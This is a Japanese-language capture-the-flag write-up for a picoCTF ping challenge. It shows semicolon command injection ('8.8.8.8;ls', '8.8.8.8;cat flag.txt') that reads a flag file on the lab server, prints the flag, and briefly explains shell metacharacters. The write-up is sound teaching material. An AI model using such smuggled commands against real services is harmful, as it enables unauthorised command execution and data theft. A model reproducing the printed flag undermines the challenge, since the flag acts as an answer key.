## category
General skills
## probrem
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, 
but what happens if you get a little creative with your input?
## 難しさ
簡単
## 解法
いつもどおりncで接続していく。
すると以下の文言が出現
```
nc mysterious-sea.picoctf.net 62194
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):
```
ここでコマンドインジェクションを利用。
```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;ls
```
```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.57 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.56 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.557/9.565/9.573/0.008 ms
flag.txt
script.sh
```
flag.txtを発見したので中身をみるコマンドを実行する。
```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;cat flag.txt
```
  するとフラグが出現。
## 使用コマンド
## 答え
```picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_b75fc848}```
## ここから学んだこと
**コマンドインジェクション**という手法。
これはシェルの解釈で
```
;
```
がコマンドを区切るという意味らしい。
なのでその後に好き勝手にコマンドを打つことができる。
これはユーザーの入力を悪用したという点でSQLインジェクションに近い。

ちなみにシェルとはユーザー入力とosをつなぐ間のものです。
つまりコマンドが区切られるのでサーバーのシェル側に区切られて認識されるのが原因。
また；はシェルのメタ文字と呼ばれるものである。
## つぎに考えること
コマンドインジェクションの対策。
shellを使っているかの見極め＞＞コマンドインジェクションをするしかない
